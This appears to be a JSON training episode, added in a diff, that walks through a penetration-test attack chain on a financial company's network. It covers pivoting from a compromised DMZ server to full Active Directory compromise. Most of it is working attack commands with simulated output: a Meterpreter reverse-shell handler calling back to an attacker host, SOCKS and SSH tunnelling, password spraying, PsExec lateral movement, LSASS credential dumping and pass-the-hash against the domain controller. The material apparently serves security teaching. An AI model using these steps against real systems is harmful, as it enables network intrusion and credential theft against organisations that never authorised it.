@@ -1,0 +1,85 @@
+{
+  "title": "Episode 1: DMZ Pivot to Internal Corporate Network",
+  "scenario": "External penetration test of a financial services company. After compromising a DMZ web server (10.10.10.100), discovered it's dual-homed with access to internal corporate network (192.168.10.0/24). Objective: Pivot through DMZ host to enumerate and compromise internal Active Directory environment.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Establish Meterpreter session on DMZ host",
+      "command": "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.50; set LPORT 4444; exploit'",
+      "output": "[*] Meterpreter session 1 opened (10.10.14.50:4444 -> 10.10.10.100:49823)\nmeterpreter > sysinfo\nComputer: PIVOT-DMZ-01\nOS: Windows Server 2019\n\nmeterpreter > ipconfig\nInterface 1: 10.10.10.100/24 (External DMZ)\nInterface 2: 192.168.10.5/24 (Internal network)\n\nDual-homed host confirmed!",
+      "explanation": "Compromised DMZ server has two network interfaces - perfect pivot point to internal network"
+    },
+    {
+      "step": 2,
+      "description": "Setup Metasploit routing and SOCKS proxy",
+      "command": "run autoroute -s 192.168.10.0/24\nbackground\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j",
+      "output": "[+] Added route to 192.168.10.0/255.255.255.0 via session 1\n[*] SOCKS proxy server started on 127.0.0.1:1080\n\nProxychains config:\nsocks5 127.0.0.1 1080",
+      "explanation": "Configured Metasploit to route traffic to internal network through Meterpreter session"
+    },
+    {
+      "step": 3,
+      "description": "Discover internal network hosts",
+      "command": "proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 192.168.10.0/24",
+      "output": "192.168.10.10 - Ports: 445,3389,5985 (Windows/DC)\n192.168.10.20 - Ports: 22,80,443,3389 (Web server)\n192.168.10.30 - Ports: 445 (File server)\n192.168.10.50 - Ports: 22,80 (Linux server)\n\n4 live hosts discovered",
+      "explanation": "Port scan through SOCKS proxy reveals Active Directory environment with Domain Controller at 192.168.10.10"
+    },
+    {
+      "step": 4,
+      "description": "Enumerate SMB and identify Domain Controller",
+      "command": "proxychains crackmapexec smb 192.168.10.0/24",
+      "output": "SMB 192.168.10.10 445 DC01 [*] Windows Server 2019 (name:DC01) (domain:CORP) (signing:True)\nSMB 192.168.10.20 445 WEB-SERVER-01 (domain:CORP) (signing:False)\nSMB 192.168.10.30 445 FILE-SERVER-01 (domain:CORP) (signing:False)\n\nDomain: CORP\nDC: DC01 at 192.168.10.10",
+      "explanation": "Identified Active Directory domain CORP with Domain Controller DC01"
+    },
+    {
+      "step": 5,
+      "description": "Setup SSH dynamic tunnel as backup pivot",
+      "command": "ssh -D 1081 -L 3389:192.168.10.20:3389 user@10.10.10.100 -N -f",
+      "output": "SSH tunnels established:\n  SOCKS5: 127.0.0.1:1081 -> 192.168.10.0/24\n  RDP: 127.0.0.1:3389 -> 192.168.10.20:3389\n\nBackup pivot method active",
+      "explanation": "Created redundant SSH tunnel as backup and for direct RDP access to web server"
+    },
+    {
+      "step": 6,
+      "description": "Enumerate Active Directory users and groups",
+      "command": "proxychains enum4linux -a 192.168.10.10",
+      "output": "Domain: CORP\nUsers: Administrator, krbtgt, john.doe, jane.smith, sqlservice, admin\nGroups: Domain Admins, Enterprise Admins, Backup Operators\n\n6 domain users enumerated",
+      "explanation": "Extracted user list for password spraying and targeted attacks"
+    },
+    {
+      "step": 7,
+      "description": "Test weak credentials on SMB",
+      "command": "proxychains crackmapexec smb 192.168.10.0/24 -u admin -p 'P@ssw0rd123'",
+      "output": "SMB 192.168.10.20 445 WEB-SERVER-01 [+] CORP\\admin:P@ssw0rd123 (Pwn3d!)\nSMB 192.168.10.30 445 FILE-SERVER-01 [+] CORP\\admin:P@ssw0rd123 (Pwn3d!)\n\nValid credentials: admin / P@ssw0rd123\nLocal admin on 2 servers",
+      "explanation": "Found reused local admin credentials working on multiple internal servers"
+    },
+    {
+      "step": 8,
+      "description": "Pivot to internal web server via PSExec",
+      "command": "use exploit/windows/smb/psexec\nset RHOSTS 192.168.10.20\nset SMBUser admin\nset SMBPass P@ssw0rd123\nset payload windows/meterpreter/bind_tcp\nexploit",
+      "output": "[*] Meterpreter session 2 opened\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer: WEB-SERVER-01\n\nSYSTEM access on internal web server",
+      "explanation": "Gained SYSTEM access on internal web server through the pivot"
+    },
+    {
+      "step": 9,
+      "description": "Dump credentials from web server",
+      "command": "load kiwi\ncreds_msv",
+      "output": "Username: sqlservice\nNTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n\nUsername: CORP\\john.doe\nNTLM: aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b\n\nDomain credentials harvested",
+      "explanation": "Extracted domain credentials from LSASS memory on compromised server"
+    },
+    {
+      "step": 10,
+      "description": "Access Domain Controller with harvested credentials",
+      "command": "proxychains impacket-psexec 'sqlservice'@192.168.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
+      "output": "C:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nDomain Controller compromised!",
+      "explanation": "Used Pass-the-Hash with sqlservice account to gain SYSTEM on Domain Controller"
+    }
+  ],
+  "outcome": "Successfully pivoted from external DMZ host to internal network, enumerated Active Directory environment, compromised multiple servers, and achieved Domain Admin equivalent access by compromising the Domain Controller. Demonstrated complete network pivot chain from external attacker to full domain compromise.",
+  "learning_objectives": [
+    "Identify and leverage dual-homed pivot points",
+    "Setup multiple pivot methods (Metasploit SOCKS, SSH tunnels)",
+    "Route reconnaissance tools through SOCKS proxies",
+    "Enumerate Active Directory from external position",
+    "Perform lateral movement through pivot points",
+    "Chain multiple compromises for privilege escalation"
+  ]
+}
